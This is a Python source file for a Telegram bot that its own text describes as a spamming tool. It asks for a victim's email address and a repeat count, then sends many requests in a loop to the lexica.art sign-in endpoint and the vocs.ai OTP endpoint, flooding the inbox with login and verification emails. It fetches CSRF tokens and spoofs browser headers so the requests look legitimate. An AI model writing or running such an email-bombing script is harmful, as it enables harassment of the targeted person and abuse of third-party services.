import telebot
from telebot import types
import requests
import threading
import json

bot = telebot.TeleBot(input("token: "))
print('Go to the bot and send /start command to start spamming.')
dataaaaa = {} 
def Kk():
    url = "https://lexica.art/api/auth/csrf"
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.70 Mobile Safari/537.36",
    }
    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        data = response.json()
        csrf_token = data["csrfToken"]
        cookies = response.cookies
        csrf_token0 = cookies.get("__Host-next-auth.csrf-token")
        return csrf_token, csrf_token0
    else:
        return None, None
def k3(csrf_token, csrf_token0, email):
    url = "https://lexica.art/api/auth/signin/email"
    payload = f"email={email}&redirect=false&callbackUrl=https%3A%2F%2Flexica.art%2Faccount&csrfToken={csrf_token}"
    headers = {
        'User-Agent': "Mozilla/5.0 (Linux; Android 11; Redmi Note 8 Build/RKQ1.201004.002) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/129.0.6668.70 Mobile Safari/537.36",
        'Content-Type': "application/x-www-form-urlencoded",
        'Cookie': f"__Host-next-auth.csrf-token={csrf_token0}; __Secure-next-auth.callback-url=https%3A%2F%2Flexica.art"
    }
    response = requests.post(url, data=payload, headers=headers)
    return response
@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup()
    count_button = types.InlineKeyboardButton('Enter number of times to send', callback_data='enter_count')
    email_button = types.InlineKeyboardButton('Enter email', callback_data='enter_email')
    markup.add(count_button, email_button)
    bot.send_message(message.chat.id, "Hello! Please choose an action:", reply_markup=markup)
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if call.data == 'enter_count':
        msg = bot.send_message(call.message.chat.id, "Please enter the number of times to send the message:")
        bot.register_next_step_handler(msg, process_count)
    elif call.data == 'enter_email':
        msg = bot.send_message(call.message.chat.id, "Please enter your email:")
        bot.register_next_step_handler(msg, Fix)

def process_count(message):
    try:
        count = int(message.text)
        dataaaaa[message.chat.id] = {'count': count}
        bot.send_message(message.chat.id, f"Number of times to send: {count} recorded.")
    except ValueError:
        bot.send_message(message.chat.id, "Please enter a valid number.")
def Fix(message):
    email = message.text
    if message.chat.id in dataaaaa and 'count' in dataaaaa[message.chat.id]:
        dataaaaa[message.chat.id]['email'] = email
        bot.send_message(message.chat.id, f"Email: {email} recorded.")
        csrf_token, csrf_token0 = Kk()
        if csrf_token and csrf_token0:
            count = dataaaaa[message.chat.id]['count']
            bot.send_message(message.chat.id, "Sending messages...")
            threading.Thread(target=sss, args=(csrf_token, csrf_token0, email, count, message.chat.id)).start()
        else:
            bot.send_message(message.chat.id, "Failed to get CSRF token.")
    else:
        bot.send_message(message.chat.id, "Please enter the number of times to send first.")

def sss(csrf_token, csrf_token0, email, count, chat_id):
    for i in range(count):
        response = k3(csrf_token, csrf_token0, email)
        if response.status_code == 200:
            bot.send_message(chat_id, f"Message {i+1} sent to {email}")
        else:
            bot.send_message(chat_id, f"Error sending message {i+1}: {response.status_code}")

        url = "https://backend.vocs.ai/api/user/sendotp"
        payload = json.dumps({"email": email})
        headers = {
            'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
            'Content-Type': "application/json",
            'access-control-allow-origin': "*",
            'sec-ch-ua': "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
            'sec-ch-ua-mobile': "?1",
            'sec-ch-ua-platform': "\"Android\"",
            'origin': "https://www.vocs.ai",
            'sec-fetch-site': "same-site",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.vocs.ai/",
            'accept-language': "ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7"
        }

        vocs_response = requests.post(url, data=payload, headers=headers)
        if vocs_response.status_code == 200:
            bot.send_message(chat_id, f"OTP sent to {email}")
        else:
            bot.send_message(chat_id, f"Error sending OTP {i+1}: {vocs_response.status_code}")
    bot.send_message(chat_id, "Work done, all emails sent.")
    markup = types.InlineKeyboardMarkup()
    channel_button = types.InlineKeyboardButton('Developer channel', url='https://t.me/k3s63cc')
    markup.add(channel_button)
    bot.send_message(chat_id, "You can also visit my channel for more updates:", reply_markup=markup)

bot.polling()
